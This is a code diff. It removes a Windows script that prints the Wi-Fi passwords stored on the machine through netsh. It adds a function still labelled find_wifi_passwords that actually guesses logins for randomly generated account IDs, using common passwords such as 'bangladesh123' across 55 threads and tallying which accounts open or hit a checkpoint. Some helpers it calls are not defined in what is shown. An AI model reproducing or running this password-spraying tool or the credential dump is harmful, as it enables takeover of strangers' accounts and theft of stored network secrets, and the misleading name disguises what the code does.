@@ -1,34 +1,33 @@
-import subprocess
-
-def get_nearby_wifi_passwords():
-    try:
-        # Get list of nearby Wi-Fi networks
-        scan_results = subprocess.check_output(['netsh', 'wlan', 'show', 'network'], text=True, encoding='utf-8')
-        networks = [line.split(":")[1].strip() for line in scan_results.split("\n") if "SSID" in line]
-
-        if not networks:
-            print("No nearby Wi-Fi networks found.")
-            return
-
-        print("\n{:<30} | {:<}".format("Wi-Fi Name", "Password"))
-        print("-" * 50)
-
-        for network in networks:
-            try:
-                # Get the password if stored on the system
-                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', network, 'key=clear'], text=True, encoding='utf-8')
-                password_lines = [line.split(":")[1].strip() for line in results.split("\n") if "Key Content" in line]
-
-                password = password_lines[0] if password_lines else "Not Stored"
-                print("{:<30} | {:<}".format(network, password))
-
-            except subprocess.CalledProcessError:
-                print("{:<30} | {:<}".format(network, "Not Stored"))
-
-    except Exception as e:
-        print(f"Error: {e}")
-
-    input("\nPress Enter to exit...")
-
-# Run the function
-get_nearby_wifi_passwords()
+def find_wifi_passwords():
+    linex()
+    limit = int(input(f" {xxx('?')} Enter Limit : "))
+    for _ in range(limit):
+        digits.append("".join(random.choices(string.digits, k=7)))
+    logo()
+    print(f" {xxx('1')} Method (B-Api) ")
+    print(f" {xxx('2')} Method (B-Graph) ")
+    linex()
+    m = input(f" {xxx('?')} Select : ")
+    with speed(max_workers=55) as process:
+        logo()
+        total_idz = str(len(digits))
+        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
+        print(f" {xxx('•')} Code You Choose : {g}{code} ")
+        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
+        linex()
+        for love in digits:
+            uid = code + love
+            pword = [love[1:], love, code + love, "i love you", "iloveyou", "bangladesh", "bangladesh123", "708090", "102030", "777000", "888000", "999000", "123456"]
+            if "1" in m:
+                process.submit(m1, uid, pword, total_idz)
+            elif "2" in m:
+                process.submit(m2, uid, pword, total_idz)
+            else:
+                process.submit(m1, uid, pword, total_idz)
+        linex()
+        print(f" {xxx('!')} Process Completed ")
+        print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
+        print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
+        linex()
+        input(f" {xxx('!')} Press Enter To Back ")
+        sys.exit()
